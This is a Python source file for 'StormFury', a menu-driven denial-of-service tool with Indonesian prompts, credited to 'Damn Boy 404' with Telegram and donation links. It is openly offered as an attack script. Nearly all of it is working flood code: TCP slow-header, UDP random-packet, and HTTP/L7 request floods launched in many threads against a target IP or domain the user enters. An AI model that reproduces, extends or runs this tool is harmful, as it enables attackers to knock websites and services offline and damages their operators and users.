import threading
import socket
import requests
import os
import subprocess
import sys
import time
from rich import print
from rich.console import Console
from rich.panel import Panel

def install_and_import(package):
    try:
        __import__(package)
        print(f"[green]Modul '{package}' sudah terpasang.[/green]")
    except ImportError:
        print(f"[yellow]Modul '{package}' tidak ditemukan. Mengunduh dan memasang...[/yellow]")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        print(f"[green]Modul '{package}' berhasil dipasang.[/green]")

install_and_import('rich')
install_and_import('requests')

console = Console()

def load_user_agents():
    if os.path.exists("useragent.txt"):
        with open("useragent.txt", "r") as f:
            return f.read().splitlines()
    else:
        print("[red]File 'useragent.txt' tidak ditemukan.[/red]")
        return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]

user_agents = load_user_agents()

# Tanda logo di sini
logo_placeholder = """
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣤⣄⣀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⡿⠿⠿⢿⠛⠋⠉⠉⠙⠛⠛⠛⠿⠿⢿⣿⣿ ⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⡿⢿⠹⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉ ⠛⠻⢿⣿⣿⣷⣤⡀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⡿⠛⣿⣯⣀⣀⠀⠙⢿⣦⣄⣀⡀⢀⣴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⠛⢿⣿⣿⣷⣄ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠟⠁⠀⠀⠈⠙⣛⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿ ⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠋⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣶⣄ ⡀⠀⠀⠀⠀⠀⠀⠀⠀⠙ ⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⣿⠟⠁⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠙⠛⢿⣿⣿⣿⣿⣿⣿ ⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠈⠻⣿⣿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⣿⣿⣯⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣇ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠙⣿⣿⣷⡀⠀⠀⠀
⠀⠀⢀⣾⣿⡿⠁⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣷⣤⣄⣀⡀⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⢿⣿⣷⡀⠀⠀
⠀⠀⣾⣿⣿⠁⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠈⠙⠻⣿⣿⣿ ⣿⣿⡿⠿⣿⣶⣤⣴⣶⣦ ⡀⠀⠀⠀⠈⢿⣿⣷⠀⠀
⠀⣸⣿⣿⠃⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⠀⠀⠀⠈⠙⢿ ⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿ ⡓⠀⠀⠀⠀⠘⣿⣿⣇⠀
⢀⣿⣿⡏⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡝⢿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠉⠛⠻⢿⣦⣄⠀⠀⠀ ⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿ ⠁⠀⠀⠀⠀⠀⢹⣿⣿⡀
⢸⣿⣿⠃⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣦⣄ ⠀⠀⠀⠀⣿⠿⣯⡙⢻⡏ ⠀⠀⠀⠀⠀⠀⠈⣿⣿⡇
⣾⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿ ⣿⣶⣶⣤⣿⣦⣼⣿⡄⠀ ⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿
⣿⣿⡏⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈ ⠉⠉⠙⠛⠛⠛⠁⢸⣿⡀ ⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀ ⣀⠀⠀⠀⠀⠀⠀⠈⣿⣧ ⠀⠀⠀⠀⠀⢳⣄⢸⣿⣿
⢿⣿⣿⢀⣤⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣶⣤⡀⠀⠀⢹⣿ ⣆⠀⠀⠀⠀⢸⡿⣿⣿⣿
⢸⣿⣿⡄⠉⠛⠉⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣦⣄⠀⢻ ⣿⡷⢦⣤⣶⠟⢁⣿⣿⡇
⠘⣿⣿⣇⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀ ⠙⢿⣤⣤⣤⡴⣸⣿⣿⠃
⠀⢹⣿⣿⡄⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⡄⠀⠈⠉⠁⢠⣿⣿⡏⠀
⠀⠀⢿⣿⣷⡀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣷⠀⠀⠀⢀⣾⣿⡿⠀⠀
⠀⠀⠈⢿⣿⣷⡀⠀⠀⠀⠀⢸⣿⣿⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⡇⠀⢀⣾⣿⡿⠁⠀⠀
⠀⠀⠀⠈⢿⣿⣷⡄⠀⣀⣀⣸⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⠃⢠⣾⣿⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠻⣿⣿⣦⡈⠛⠛⠋⠀⠀⠀⢹⡟⠀⠈⠉⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣟⣴⣿⣿⠟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣶⣦⣤⣀⣀⡀⠀⠀⠀⠀⣀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠛⠛⠉ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

author_info = "[red]Author: [white]Damn Boy 404[/white][/red]"
instructions = """
Instruksi:
1. Pilih jenis serangan yang diinginkan.
2. Masukkan IP atau domain target.
3. Masukkan port target.
4. Masukkan durasi serangan (dalam detik).
5. Masukkan jumlah threads per detik.
6. Tunggu hingga proses serangan selesai.
"""

telegram_info = "[blue]Telegram: [white]https://t.me/damn_boy_404[/white][/blue]"
saweria_info = "[green]Saweria: [white]https://saweria.co/damn_boy_404[/white][/green]"

def tcp_flood(target_ip, target_port, duration):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, target_port))
        client.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                client.sendto(b"X-a: b\r\n", (target_ip, target_port))
            except Exception as e:
                print(f"[red][ERROR] {str(e)}[/red]")
                break
    except Exception as e:
        print(f"[red][ERROR] {str(e)}[/red]")

def udp_flood(target_ip, target_port, duration):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = os.urandom(1024)
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                client.sendto(bytes, (target_ip, target_port))
            except Exception as e:
                print(f"[red][ERROR] {str(e)}[/red]")
                break
    except Exception as e:
        print(f"[red][ERROR] {str(e)}[/red]")

def http_flood(target_ip, duration):
    user_agent = user_agents[0]
    headers = {"User-Agent": user_agent}
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            response = requests.get(f"http://{target_ip}", headers=headers)
            if response.status_code == 200:
                print(f"[green]Request to {target_ip} successful.[/green]")
            else:
                print(f"[yellow]Request to {target_ip} returned status code {response.status_code}.[/yellow]")
        except Exception as e:
            print(f"[red][ERROR] {str(e)}[/red]")

def l7_flood(target_ip, duration, method="GET"):
    user_agent = user_agents[0]
    headers = {
        "User-Agent": user_agent,
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            if method == "GET":
                response = requests.get(f"http://{target_ip}", headers=headers)
            elif method == "POST":
                response = requests.post(f"http://{target_ip}", headers=headers, data={"key": "value"})
            elif method == "PUT":
                response = requests.put(f"http://{target_ip}", headers=headers, data={"key": "value"})
            elif method == "DELETE":
                response = requests.delete(f"http://{target_ip}", headers=headers)
            else:
                print(f"[red][ERROR] HTTP method tidak valid. Gunakan 'GET', 'POST', 'PUT', atau 'DELETE'.[/red]")
                return
            if response.status_code == 200:
                print(f"[green]Request to {target_ip} using {method} successful.[/green]")
            else:
                print(f"[yellow]Request to {target_ip} using {method} returned status code {response.status_code}.[/yellow]")
            time.sleep(0.1)  # Add delay to avoid overwhelming the server
        except Exception as e:
            print(f"[red][ERROR] {str(e)}[/red]")

def get_ip_from_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        print(f"[red][ERROR] Domain tidak valid atau tidak dapat ditemukan.[/red]")
        return None

def check_website_status(target_ip):
    try:
        response = requests.get(f"http://{target_ip}")
        status_code = response.status_code
        if status_code == 200:
            print(f"[green]Website {target_ip} is up. Status code: {status_code}[/green]")
        else:
            print(f"[yellow]Website {target_ip} is reachable but returned status code: {status_code}[/yellow]")
    except requests.exceptions.RequestException as e:
        print(f"[red][ERROR] Cannot reach website {target_ip}: {str(e)}[/red]")

def ddos_attack(target_ip, target_port, duration, attack_type, threads_per_second):
    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(threads_per_second):
            if attack_type == "TCP":
                thread = threading.Thread(target=tcp_flood, args=(target_ip, target_port, duration // threads_per_second))
            elif attack_type == "UDP":
                thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration // threads_per_second))
            elif attack_type == "HTTP":
                thread = threading.Thread(target=http_flood, args=(target_ip, duration // threads_per_second))
            elif attack_type == "L7":
                method = input(f"[yellow]Masukkan metode L7 (GET/POST/PUT/DELETE): ").upper()
                thread = threading.Thread(target=l7_flood, args=(target_ip, duration // threads_per_second, method))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()

def main():
    while True:
        os.system('clear')
        print(Panel("[magenta]DDoS Attack Script[/magenta]", title="StormFury"))
        print(author_info)
        print(logo_placeholder)
        print(instructions)
        print(telegram_info)
        print(saweria_info)
        print("[1] DDoS Biasa (TCP)")
        print("[2] DDoS L4 (UDP)")
        print("[3] DDoS L7 (HTTP)")
        print("[4] DDoS Mix")
        print("[5] Keluar")

        choice = input("Pilih opsi: ")
        if choice == '5':
            break

        target = input("Masukkan IP atau Domain Target: ")
        if target.startswith("http"):
            print(f"[red][ERROR] Masukkan hanya domain atau IP, tanpa http/https.[/red]")
            continue
        target_ip = get_ip_from_domain(target) if not target.replace('.', '').isdigit() else target
        if not target_ip:
            continue
        check_website_status(target_ip)

        try:
            target_port = int(input("Masukkan Port Target: "))
            duration = int(input("Masukkan Durasi Serangan (detik): "))
            threads_per_second = int(input("Masukkan Threads Per Detik: "))

            if duration <= 0 or threads_per_second <= 0:
                print(f"[red][ERROR] Durasi dan Threads Per Detik harus lebih besar dari 0[/red]")
                continue

            if choice == '1':
                attack_type = "TCP"
                ddos_attack(target_ip, target_port, duration, attack_type, threads_per_second)
            elif choice == '2':
                attack_type = "UDP"
                ddos_attack(target_ip, target_port, duration, attack_type, threads_per_second)
            elif choice == '3':
                attack_type = "HTTP"
                ddos_attack(target_ip, target_port, duration, attack_type, threads_per_second)
            elif choice == '4':
                attack_type = input("Masukkan tipe serangan Mix (TCP/UDP/HTTP/L7): ").upper()
                ddos_attack(target_ip, target_port, duration, attack_type, threads_per_second)
            else:
                print(f"[red][ERROR] Pilihan tidak valid.[/red]")
                continue

            print(f"[green][SELESAI] Serangan ke {target_ip}:{target_port} telah selesai.[/green]")
        except ValueError:
            print(f"[red][ERROR] Masukkan angka yang valid.[/red]")

if __name__ == "__main__":
    main()